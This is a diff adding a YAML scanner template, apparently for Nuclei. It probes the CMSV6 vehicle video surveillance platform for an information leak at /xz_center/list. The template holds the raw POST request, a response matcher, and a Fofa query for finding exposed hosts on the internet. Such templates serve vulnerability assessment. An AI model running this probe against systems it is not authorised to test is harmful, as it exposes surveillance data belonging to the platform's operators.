@@ -1,0 +1,33 @@
+id: g-sky_CMSV6_xz_center_information_leakage
+
+info:
+  name: g-sky_CMSV6_xz_center_information_leakage
+  author: HK
+  severity: high
+  description: 通天星CMSV6车载视频监控平台/xz_center/list存在信息泄露漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="/808gps/"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /xz_center/list HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Content-Length: 6
+
+    page=1
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - pagination
